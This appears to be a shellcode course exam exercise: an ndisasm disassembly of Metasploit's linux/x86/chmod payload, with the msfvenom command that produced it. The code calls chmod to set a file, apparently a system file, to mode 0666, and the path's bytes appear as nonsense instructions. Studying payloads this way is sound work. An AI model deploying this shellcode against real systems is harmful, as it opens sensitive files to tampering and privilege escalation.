; SLAE Exam Assignment #5: Metasploit Shellcode chmod 
; msfvenom -p linux/x86/chmod -f raw | ndisasm -u - | cut -f4- -d" " | column -t

global _start

section .text

_start:
    cdq
    push  byte   +0xf
    pop   eax
    push  edx
    call  0x16
    das
    gs    jz     0x71
    das
    jnc   0x79
    popa
    fs    outsd
    ja    0x16
    pop   ebx
    push  dword  0x1b6
    pop   ecx
    int   0x80
    push  byte   +0x1
    pop   eax
    int   0x80